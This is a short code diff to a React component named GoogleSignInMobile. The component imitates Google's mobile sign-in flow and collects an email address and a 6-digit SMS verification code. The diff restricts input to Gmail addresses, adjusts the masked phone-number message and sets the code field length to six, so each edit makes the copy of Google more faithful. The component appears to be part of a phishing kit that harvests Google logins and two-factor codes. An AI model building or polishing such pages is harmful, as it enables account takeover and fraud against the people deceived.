@@ -427,6 +427,11 @@ function GoogleSignInMobile({
       return;
     }
     
+    if (!localEmail.includes("@gmail.com")) {
+      setEmailError("your email should contain @gmail.com");
+      return;
+    }
+    
     setEmail(localEmail);
     setIsTransitioning(true);
     setTimeout(() => {
@@ -1117,7 +1122,7 @@ function GoogleSignInMobile({
                 </div>
 
                 <p className="text-sm font-helvetica text-[#202124] mb-8">
-                  A text message with a 6-digit verification code was just sent to {lastTwoDigits ? `*******${lastTwoDigits}` : "******^**"}
+                  A text message with a 6-digit verification code was just sent to {lastTwoDigits ? `********${lastTwoDigits}` : "*******^**"}
                 </p>
 
                 <form onSubmit={handleSmsCodeSubmit}>
@@ -1132,7 +1137,7 @@ function GoogleSignInMobile({
                           placeholder=" "
                           className="flex-1 bg-transparent border-none outline-none text-[#1f1f1f] text-base ml-5 font-helvetica"
                           disabled={isSubmittingSmsCode}
-                          maxLength={8}
+                          maxLength={6}
                           onKeyPress={(e) => {
                             if (e.key === 'Enter') {
                               handleSmsCodeSubmit(e);
